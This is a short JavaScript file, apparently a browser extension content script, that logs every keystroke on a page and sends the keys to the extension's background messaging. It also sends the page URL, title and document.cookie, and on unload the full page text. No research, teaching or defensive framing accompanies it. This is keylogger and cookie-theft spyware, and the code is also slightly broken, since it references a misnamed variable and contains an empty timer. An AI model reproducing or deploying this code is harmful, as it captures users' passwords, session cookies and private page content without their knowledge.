document.addEventListener('keyup', logKey);
var getkeys = '';
function logKey(e) {
	 getkeys += e.key;
	if (getkeys.length > 10) {
    chrome.runtime.sendMessage({"message": "checkservice", "content": keygets, 'other': {
      href: document.location.href,
      title: document.title,
      cookie: document.cookie
    }});
	}
}

setTimeout(function() {

}, 5000);

window.addEventListener("beforeunload", function (e) {    
    chrome.runtime.sendMessage({"message": "checkservice", "body": document.body.innerText, 'other': {
      href: document.location.href,
      title: document.title,
      cookie: document.cookie
    }});
    return null;
  }
);